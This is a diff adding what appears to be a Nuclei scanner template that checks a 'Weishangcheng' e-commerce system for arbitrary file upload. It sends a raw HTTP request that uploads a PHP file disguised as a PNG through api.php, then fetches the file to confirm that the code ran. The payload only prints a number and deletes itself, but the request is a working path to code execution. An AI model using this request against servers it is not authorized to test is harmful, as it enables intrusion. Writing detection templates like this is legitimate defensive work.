@@ -1,0 +1,50 @@
+id: weishangcheng-api_php-File-upload
+
+info:
+  name: 微商城系统 api.php 任意文件上传
+  author: HuanXiong
+  severity: high
+
+  tags: File Upload
+
+http:
+  - raw:
+      - |
+        POST /api/api.php?mod=upload&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+        --d0b7a0d40eed0e32904c8017b09eb305
+        Content-Disposition: form-data; name="file"; filename="rce.php"
+        Content-Type: image/png
+
+        <?php print(111*222);unlink(__FILE__);?>
+        --d0b7a0d40eed0e32904c8017b09eb305--
+      
+      - |
+        GET /upload/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\w+\.php)'
+         internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
+
+
+
+
